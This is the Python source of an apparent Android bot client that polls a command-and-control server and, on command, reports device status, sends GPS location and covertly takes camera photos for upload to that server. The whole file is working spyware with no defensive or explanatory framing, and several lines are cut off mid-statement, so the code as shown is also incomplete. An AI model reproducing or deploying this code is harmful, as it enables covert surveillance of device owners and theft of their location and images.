             bot_client.py 
# bot_client.py
import requests
import time
from plyer import camera, gps
import os

SERVER = "http://your ip c2 server:5000"

def get_command():
    try:
        r = requests.get(SERVER + "/get_command")
        return r.text.strip()
    except:
        return ""

def send_data(data):
    try:
        requests.post(SERVER + "/send_data", data={"da>
    except:
        pass

def execute_command(cmd):
    if cmd == "info":
        send_data("Bot Online: Android Device")
    elif cmd == "location":
        gps.configure(on_location=lambda **kwargs: sen>
        gps.start()
        time.sleep(5)
        gps.stop()
    elif cmd == "photo":
        path = "/sdcard/pic.jpg"
        camera.take_picture(filename=path, on_complete>
    else:
        send_data(f"Unknown command: {cmd}")

def main_loop():
    while True:
        cmd = get_command()
        if cmd:
            execute_command(cmd)
        time.sleep(5)

if __name__ == "__main__":
    main_loop()
